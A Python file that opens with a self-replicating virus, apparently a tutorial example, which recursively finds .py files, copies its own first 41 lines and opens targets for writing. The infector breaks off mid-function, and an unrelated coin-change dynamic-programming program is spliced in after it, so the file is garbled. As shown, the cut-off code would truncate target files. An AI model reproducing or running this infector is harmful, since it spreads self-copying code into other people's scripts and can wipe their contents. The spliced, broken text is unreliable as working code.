#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# A Dynamic Programming based Python3 program to
# find minimum of coins to make a given change V
import sys
 
# m is size of coins array (number of
# different coins)
def minCoins(coins, m, V):
     
    # table[i] will be storing the minimum
    # number of coins required for i value.
    # So table[V] will have result
    table = [0 for i in range(V + 1)]
 
    # Base case (If given value V is 0)
    table[0] = 0
 
    # Initialize all table values as Infinite
    for i in range(1, V + 1):
        table[i] = sys.maxsize
 
    # Compute minimum coins required
    # for all values from 1 to V
    for i in range(1, V + 1):
         
        # Go through all coins smaller than i
        for j in range(m):
            if (coins[j] <= i):
                sub_res = table[i - coins[j]]
                if (sub_res != sys.maxsize and
                    sub_res + 1 < table[i]):
                    table[i] = sub_res + 1
     
    if table[V] == sys.maxsize:
        return -1
       
    return table[V]
 
# Driver Code
if __name__ == "__main__":
 
    coins = [9, 6, 5, 1]
    m = len(coins)
    V = 11
    print("Minimum coins required is ",
                 minCoins(coins, m, V))
 
# This code is contributed by ita_c